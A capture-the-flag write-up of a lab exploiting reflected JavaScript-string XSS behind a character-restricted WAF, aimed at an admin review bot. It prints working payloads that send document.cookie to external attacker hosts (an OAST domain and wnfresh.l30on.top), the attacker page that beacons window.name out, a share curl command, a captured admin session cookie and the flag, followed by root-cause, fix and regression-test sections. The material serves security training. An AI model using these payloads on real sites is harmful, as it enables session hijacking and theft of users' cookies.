# Velvet Pwnbox Lab - WAF Charset XSS Admin Bot

**Date:** 2026-07-09  
**Target:** https://1877bcf64628.pwnbox-lab.com/  
**Status:** Solved

## Lab description

Members' area. "Doorman" WAF allows only "ordinary characters." Sign in with demo account, bypass filter, share a link to admin who reviews it.

**Demo creds:** `demouser` / `qwerty@123`

## App surface (confirmed)

| Endpoint | Role |
|----------|------|
| `GET /login` | Login form |
| `POST /login` | Auth endpoint used by browser session |
| `GET /profile` | Auth required; XSS sink + share UI |
| `POST /share` | JSON `{url}` — admin bot visits same-origin URL |
| `GET /logout` | Clears session |

No other useful first-party routes mattered for the solve. The helper infrastructure came from `https://l30on.top/`.

## XSS sink (confirmed)

`GET /profile?message=PAYLOAD` (authenticated) reflects into:

```javascript
// A humble gift for you =D
var message = "PAYLOAD";
```

Only reflection point. `message` variable is **unused** in page JS — exploit requires **string breakout**, not relying on `message` being read later.

Unauthenticated `/profile?message=...` → 302 `/login` (query param lost). Admin bot must visit **with admin session**.

## WAF allowlist (confirmed)

**Allowed:** `./0123456789;=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz` plus `"`, `'`, space

**Blocked (400 `WAF: disallowed characters in message`):** `() + ? : , [] {} - _ @ # $ % & * \` !` and unicode hyphen lookalikes

Notes:
- `"` closes the JS string early → breakout works
- `/` alone is OK; `https://` blocked (colon)
- Hyphens blocked anywhere in payload → **webhook.site UUID paths unusable**
- `+` blocked even inside single-quoted strings in payload
- Base64 alphabet fits allowlist, but no useful decoder/exec gadget was needed

## Working payloads (WAF-passing)

### Proof of external navigation (admin bot confirmed)

```
";location="//OAST_DOMAIN/";//
```

Admin bot hit interactsh (DNS + HTTP) on `*.oast.fun`, `*.oast.pro`, `*.oast.live`.

### Cookie exfil without `+`

```
";location.hostname="OAST_DOMAIN";location.search=document.cookie;//
```

Sets cross-origin URL to `https://OAST_DOMAIN/?<cookie>` without using `+`, `?`, or `()` in payload.

Example OAST (ephemeral): `d97dlos9udq47sgh1ptg7i6ftui896to7.oast.live`

### Winning `window.name` payload

```text
";name=document.cookie;location='//wnfresh.l30on.top'//
```

This stayed within the WAF allowlist:

- no `()`
- no `+`
- no `?`
- no `:`
- no `-`

The payload stores the admin cookie in `window.name`, then performs a top-level cross-origin navigation to an attacker-controlled page on `wnfresh.l30on.top`. That page reads `window.name` and logs it by issuing a same-origin request to:

```text
/x?d=<encoded window.name>
```

### Same-origin cookie navigation (works syntactically, but not needed)

```
";location=document.cookie;//
```

### Alert PoC (WAF-passing, not useful for exfil)

```
";onerror=alert;throw 1;//
```

## Failed / dead ends

| Approach | Why it failed |
|----------|----------------|
| Pure base64 in `message` (no breakout) | No server/client auto-decode; inert |
| `";eval(atob(message));//` | `()` blocked by WAF |
| `";onerror=eval;throw '...';//` | eval receives `"Uncaught ..."` prefix → SyntaxError |
| `";onerror=location.assign;throw document.cookie;//` | `Illegal invocation` (assign unbound) |
| `";onerror=eval;throw 'location=...';//` | Same eval/onerror prefix issue |
| `webhook.site/{uuid}` in payload | Hyphens in UUID blocked |
| `+` for string concat / query building | Blocked everywhere in message param |
| `share_url` / `shareLink()` | Underscore / parens blocked; can't auto-trigger share |
| External catcher only (`requestcatcher`) | Bot hit attacker page, but off-site beacon was weaker than reading helper-site request logs directly |
| Reusing an existing helper subdomain | Admin sometimes fetched stale content; fresh subdomain removed cache ambiguity |
| First `wnfresh` share | Bot reached the host before the new entry propagated; first visit returned `404` |

## Helper infrastructure (confirmed)

User-provided helper site: `https://l30on.top/`

Confirmed useful components:

- `POST /api/auth/login` authenticates to helper dashboard
- `SubKeeper` serves attacker-controlled HTML on `*.l30on.top`
- `SubKeeper` API exposes:
  - `GET /subkeeper-api/list`
  - `POST /subkeeper-api/create`
  - `PUT /subkeeper-api/update/<id>`
  - `GET /subkeeper-api/logs`

Attacker page content used on fresh host:

```html
<!doctype html><meta charset="utf-8"><title>wnfresh</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
```

Observation:

- A top-level navigation from another origin to `https://wnprobe.l30on.top/` preserved `window.name` in this browser/runtime.
- The admin bot later did the same on `wnfresh.l30on.top`.

## Share flow

```bash
curl -sS -X POST "https://1877bcf64628.pwnbox-lab.com/share" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<demo-session>" \
  -d '{"url":"https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//wnfresh.l30on.top%27//"}'
```

Same-origin check on share: host must be lab domain.

## Observation -> hypothesis -> evidence -> test -> result -> conclusion

### Observation

- `message` reflects inside a JavaScript string.
- The WAF blocks many normal XSS characters and function-call syntax.
- `/share` queues a same-origin URL for an admin bot.

### Hypothesis

A payload that avoids blocked characters can still break out of the string, save `document.cookie` into `window.name`, and redirect the bot to an attacker page that reads the carried `window.name` value.

### Evidence

- Browser/runtime test confirmed cross-origin top-level navigation preserved `window.name`.
- `SubKeeper` logs showed the admin bot visiting attacker-controlled subdomains from `51.89.253.208`.
- Final `SubKeeper` log recorded a second request with `/x?d=<encoded data>`, proving the attacker page read and sent `window.name`.

### Test

1. Create fresh helper subdomain `wnfresh.l30on.top`.
2. Serve attacker page that reads `window.name` and requests `/x?d=` plus the encoded value.
3. Submit same-origin lab URL with `message` payload:
   ```text
   ";name=document.cookie;location='//wnfresh.l30on.top'//
   ```
4. Poll `SubKeeper` logs for `wnfresh`.

### Result

Confirmed admin bot traffic:

- `GET /` on `wnfresh.l30on.top`
- `GET /x?d=session%3D...%3B%20FLAG%3Dpwnbox%7B...%7D`

Decoded captured value:

```text
session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ak-Lrg.TXqBlni_WgvNEeZjsygNmS7DOZ8; FLAG=pwnbox{f665ddb79c5e5d390213498ce8909184}
```

### Conclusion

The lab is solved through reflected JavaScript-string XSS plus admin-bot same-origin URL review, with `window.name` used as the cross-origin data carrier.

## Exfil tooling

- **requestcatcher** — useful for early proof that off-site navigation/beacons worked
- **l30on.top / SubKeeper** — winning infrastructure because it provided:
  - attacker-controlled subdomains
  - same-site request logs
  - no need for blocked characters in the lab payload

## Minimal proof of concept

Victim URL:

```text
https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//wnfresh.l30on.top%27//
```

Attacker page:

```html
<!doctype html><meta charset="utf-8"><title>wnfresh</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
```

## Root cause

- User input reaches a JavaScript string without safe context-aware encoding.
- The WAF acts as a character denylist/allowlist but does not prevent semantic string breakout.
- The admin bot visits same-origin attacker-controlled URLs in a privileged browser context.
- Sensitive admin cookie state is readable by JavaScript.

## Fix

- Encode reflected data for JavaScript string context.
- Avoid embedding raw user input inside executable JavaScript.
- Set sensitive cookies `HttpOnly`.
- Isolate admin bot sessions from privileged cookies or review user content on a separate origin.
- Add regression tests for reflected parameters plus bot-review flows.

## Regression test

1. Request `/profile?message=";alert(1);//` and verify it renders inertly.
2. Verify quotes, slashes, and semicolons in `message` do not alter page script execution.
3. Confirm the admin review flow does not execute user-controlled script in a privileged same-origin session.
4. Confirm admin secrets are not exposed to `document.cookie`.

## Key URLs / artifacts

- Lab: `https://1877bcf64628.pwnbox-lab.com/`
- Helper site: `https://l30on.top/`
- Winning helper host: `https://wnfresh.l30on.top/`

## Flag

`pwnbox{f665ddb79c5e5d390213498ce8909184}`
